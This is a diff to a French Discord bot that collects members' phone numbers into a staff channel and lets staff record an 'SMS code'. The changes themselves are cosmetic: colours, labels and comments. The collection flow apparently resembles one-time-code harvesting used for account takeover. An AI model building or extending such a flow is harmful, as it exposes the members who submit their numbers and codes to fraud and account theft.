@@ -3,7 +3,6 @@ from threading import Thread
 import discord
 from discord.ext import commands
 import os
-import re
 
 # --- SERVEUR WEB FLASK POUR RENDER ---
 app = Flask('')
@@ -28,16 +27,21 @@ intents.message_content = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-# ID de ton salon staff (où les demandes de vérification vont atterrir)
+# ID de ton salon staff
 STAFF_CHANNEL_ID = 1530354736866263042
 
-# Dictionnaire pour suivre les membres en temps réel (s'ils quittent le serveur)
+# Dictionnaire pour le suivi en temps réel des membres
 VERIFICATION_MESSAGES = {}
+
+# --- COULEUR DU THÈME ---
+TANA_PINK = discord.Color.from_rgb(255, 153, 153) # Rose Tanalounge
 
 # --- MODAL POUR QUE LE MEMBRE ENTRE SON NUMÉRO ---
 class UserPhoneNumberModal(discord.ui.Modal, title="Vérification — Numéro de téléphone"):
+    # Note : Discord ne permet pas de changer la couleur de la bordure du TextInput par programmation,
+    # elle est définie par défaut par le thème client de l'utilisateur.
     phone_input = discord.ui.TextInput(
-        label="Ton numéro (10 chiffres max, sans lettres)",
+        label="Entre ton numéro (10 chiffres, sans lettres)",
         placeholder="Ex: 0612345678",
         min_length=10,
         max_length=10,
@@ -54,12 +58,12 @@ class UserPhoneNumberModal(discord.ui.Modal, title="Vérification — Numéro de
 
         await interaction.response.send_message("✅ Ton numéro a bien été transmis au staff ! Patiente quelques instants.", ephemeral=True)
 
-        # Envoi de la demande dans le salon Staff
+        # Envoi dans le salon Staff
         staff_channel = bot.get_channel(STAFF_CHANNEL_ID)
         if staff_channel:
             embed = discord.Embed(
                 title="VÉRIFICATION",
-                color=discord.Color.from_rgb(46, 204, 113)
+                color=TANA_PINK # Utilisation du rose
             )
             
             embed.add_field(name="Utilisateur", value=f"{interaction.user.mention}", inline=False)
@@ -74,10 +78,9 @@ class UserPhoneNumberModal(discord.ui.Modal, title="Vérification — Numéro de
             view = VerificationView(numero=numero)
             msg = await staff_channel.send(embed=embed, view=view)
             
-            # Stocke le message pour le suivi en temps réel
             VERIFICATION_MESSAGES[interaction.user.id] = msg
 
-# --- VUE DU BOUTON "SE VÉRIFIER" (Sur le serveur principal) ---
+# --- VUE DU BOUTON "SE VÉRIFIER" ---
 class PublicVerifyView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
@@ -119,7 +122,7 @@ class StaffCodeModal(discord.ui.Modal, title="Entrer le code SMS"):
         await interaction.response.edit_message(embed=embed, view=self.verification_view)
         await interaction.followup.send(f"✅ Code SMS enregistré avec succès : `{code_saisi}`", ephemeral=True)
 
-# --- VUE DES ACTIONS DU STAFF (Sur le serveur staff) ---
+# --- VUE DES ACTIONS DU STAFF ---
 class VerificationView(discord.ui.View):
     def __init__(self, numero: str):
         super().__init__(timeout=None)
@@ -204,14 +207,13 @@ async def on_member_remove(member):
         except Exception as e:
             print(f"Erreur lors de la mise à jour du départ du membre : {e}")
 
-# --- COMMANDE POUR GÉNÉRER LE MESSAGE DE VÉRIFICATION SUR LE SERVEUR PRINCIPAL ---
 @bot.command()
 async def setup_verify(ctx):
     """Envoie le message avec le bouton 'Se vérifier' sur le serveur principal"""
     embed = discord.Embed(
         title="📱 Vérification",
         description="Clique sur le bouton ci-dessous pour entrer ton numéro et lancer ta vérification.\nLe staff recevra ensuite ta demande.",
-        color=discord.Color.blue()
+        color=TANA_PINK # Utilisation du rose
     )
     view = PublicVerifyView()
     await ctx.send(embed=embed, view=view)
